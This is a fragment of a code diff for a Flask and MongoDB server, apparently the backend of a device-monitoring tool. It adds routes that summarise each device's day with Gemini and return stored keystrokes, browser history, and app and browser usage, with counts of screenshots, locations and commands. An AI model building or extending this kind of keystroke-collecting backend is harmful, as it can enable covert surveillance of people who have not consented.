+            "device_name": device_name,
+            "summary_date": date_key,
+            "created_at": datetime.now(),
+            "source": f"gemini:{model_name}",
+            "stats": {
+                "total_app_seconds": total_app_seconds,
+                "top_apps": top_apps,
+                "browser_history_entries": len(history_items),
+                "top_domains": top_domains,
+                "first_visit": first_visit,
+                "last_visit": last_visit,
+                "browser_total_seconds": browser_total_seconds,
+                "top_browsers": top_browsers,
+                "keystroke_entries": keystroke_entries,
+                "keystroke_chars": keystroke_chars,
+                "screenshots": screenshots_count,
+                "commands": command_counts,
+                "locations": locations_count
+            }
+        }},
+        upsert=True
+    )
+
+    return jsonify({
+        "status": "success",
+        "summary": summary_text,
+        "summary_date": date_key,
+        "source": f"gemini:{model_name}"
+    })
+
+@app.route('/api/ai/models', methods=['GET'])
+@login_required
+def list_ai_models():
+    """List available Gemini models for this API key."""
+    if not GEMINI_API_KEY:
+        return jsonify({"error": "GEMINI_API_KEY is not set in .env"}), 400
+    models = _list_gemini_models()
+    return jsonify({"models": models, "count": len(models)})
+
+@app.route('/api/daily-report/<device_id>', methods=['GET'])
+@login_required
+def daily_report(device_id):
+    """Return raw activity data for a selected date."""
+    if not verify_device_access(device_id):
+        return jsonify({"error": "Unauthorized: You don't have access to this device"}), 403
+
+    date_str = request.args.get('date')
+    date_key, start_dt, end_dt = _get_day_range(date_str)
+
+    keystrokes = list(keystrokes_col.find({
+        "device_id": device_id,
+        "created_at": {"$gte": start_dt, "$lt": end_dt}
+    }).sort("created_at", -1).limit(200))
+
+    for item in keystrokes:
+        item["_id"] = str(item.get("_id"))
+        item["created_at"] = str(item.get("created_at", ""))
+
+    browser_history = list(db["browser_history"].find({
+        "device_id": device_id,
+        "created_at": {"$gte": start_dt, "$lt": end_dt}
+    }).sort("created_at", -1).limit(200))
+
+    if not browser_history:
+        browser_history = _filter_by_day(
+            list(db["browser_history"].find({"device_id": device_id}).sort("_id", -1).limit(500)),
+            start_dt,
+            end_dt
+        )
+
+    for item in browser_history:
+        item["_id"] = str(item.get("_id"))
+        item["created_at"] = str(item.get("created_at", ""))
+        if item.get("visited_at"):
+            item["visited_at"] = str(item.get("visited_at"))
+
+    app_usage = list(db["app_usage"].find({
+        "device_id": device_id,
+        "created_at": {"$gte": start_dt, "$lt": end_dt}
+    }).sort("created_at", -1).limit(200))
+
+    if not app_usage:
+        app_usage = _filter_by_day(
+            list(db["app_usage"].find({"device_id": device_id}).sort("_id", -1).limit(500)),
+            start_dt,
+            end_dt
+        )
+
+    for item in app_usage:
+        item["_id"] = str(item.get("_id"))
+        item["created_at"] = str(item.get("created_at", ""))
+
+    browser_usage = list(db["browser_usage"].find({
+        "device_id": device_id,
+        "created_at": {"$gte": start_dt, "$lt": end_dt}
+    }).sort("created_at", -1).limit(200))
+
+    if not browser_usage:
+        browser_usage = _filter_by_day(
+            list(db["browser_usage"].find({"device_id": device_id}).sort("_id", -1).limit(500)),
+            start_dt,
+            end_dt
+        )
+
+    for item in browser_usage:
+        item["_id"] = str(item.get("_id"))
+        item["created_at"] = str(item.get("created_at", ""))
+
+    return jsonify({
+        "date": date_key,
+        "keystrokes": keystrokes,
+        "browser_history": browser_history,
+        "app_usage": app_usage,
+        "browser_usage": browser_usage
+    })
+
 if __name__ == '__main__':
     # Create indexes for better performance
     devices_col.create_index("device_id", unique=True)
@@ -1503,6 +2525,11 @@ if __name__ == '__main__':
     results_col.create_index("device_id")
     keystrokes_col.create_index("device_id")
     screenshots_col.create_index("device_id")
+    summaries_col.create_index([("device_id", 1), ("summary_date", 1)])
+    db["locations"].create_index("device_id")
+    db["browser_history"].create_index("device_id")
+    db["app_usage"].create_index("device_id")
+    db["browser_usage"].create_index("device_id")
     
     # Startup logging
     print("\n" + "="*60)
